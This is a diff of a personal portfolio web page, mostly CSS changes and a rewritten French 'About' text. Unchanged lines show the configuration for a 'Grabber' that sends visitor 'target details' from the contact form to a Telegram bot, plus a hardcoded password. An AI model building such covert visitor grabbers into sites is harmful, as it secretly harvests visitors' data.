@@ -82,7 +82,7 @@
             letter-spacing: 1px;
         }
 
-        /* اقتباس الحس بحروف فرنسية (Franco-Arabe) */
+        /* اقتباس الحس بحروف فرنسية (Franco) في واجهة الدخول */
         .el_hass-quote {
             font-style: italic;
             color: #aaa;
@@ -199,18 +199,27 @@
             letter-spacing: 1px;
         }
 
-        /* About */
+        /* About Section - العودة إلى النسخة الفرنسية المستوحاة من أغنية طبيب نفسي */
         .about {
             max-width: 900px;
             margin: 30px auto;
             padding: 35px;
             text-align: center;
             width: 90%;
+            border-left: 4px solid #60a5fa;
+        }
+
+        .about h2 {
+            color: #60a5fa;
+            margin-bottom: 15px;
+            font-family: monospace;
         }
 
         .about p {
-            font-size: 18px;
-            line-height: 1.6;
+            font-size: 17px;
+            line-height: 1.7;
+            color: #e2e8f0;
+            font-style: italic;
         }
 
         /* Stats */
@@ -414,11 +423,12 @@
         </section>
 
         <section class="about glass">
-            <h2>À Propos de Moi</h2>
+            <h2>// Diagnostique Psychologique</h2>
             <p>
-                Bonjour, je m'appelle Abd Jalil, je viens d'Algérie 🇩🇿. 
-                Je suis passionné par le fitness, la technologie, la programmation et les jeux vidéo. 
-                Je cherche toujours à me surpasser et à acquérir de nouvelles compétences chaque jour.
+                "Loin des illusions de ce monde, j'ai choisi de m'isoler pour me reconstruire. 
+                Là où les déceptions brisent les autres, je transforme le silence et l'amertume en force brute. 
+                Pas besoin de psychologue ; mes poids à la salle pansent mes blessures, et mes lignes de code dictent ma propre thérapie. 
+                Bienvenue dans mon sanctuaire, forgé dans l'ombre de l'Algérie 🇩🇿."
             </p>
         </section>
 
@@ -486,7 +496,7 @@
         <h2 class="section-title">Laissez-moi un Message</h2>
         <section class="contact-section glass">
             <form class="contact-form" onsubmit="sendWithTargetDetails(event)">
-                <input type="text" id="senderName" placeholder="Votre Nom (ou Anonyme)" required>
+                <input type="text" id="senderName" placeholder="Votre Nom (ou Anonymه)" required>
                 <textarea rows="5" id="senderMessage" placeholder="Votre Message..." required></textarea>
                 <button type="submit" id="sendBtn">Envoyer Sécurisé 🔒</button>
             </form>
@@ -508,11 +518,10 @@
     </div>
 
     <script>
-        // Config Telegram pour le Grabber (املاً البيانات هنا ليعمل السكربت)
+        // Config Telegram pour le Grabber
         const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; 
         const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; 
 
-        // Mot de passe par défaut
         const CORRECT_PASSWORD = "1234"; 
 
         function checkPassword() {
@@ -592,7 +601,6 @@
                 });
         }
 
-        // Compteur de Visites
         function updateViews() {
             let currentViews = localStorage.getItem("portfolio_views");
             if (!currentViews) { currentViews = 1; } 
@@ -601,7 +609,6 @@
             document.getElementById("visitorCount").textContent = currentViews;
         }
 
-        // Effets Textes et Matrix
         function initEffects() {
             const words = ["Fitness Enthusiast", "Python Developer", "Hardcore Gamer", "Cybersecurity Student"];
             let wordIndex = 0;
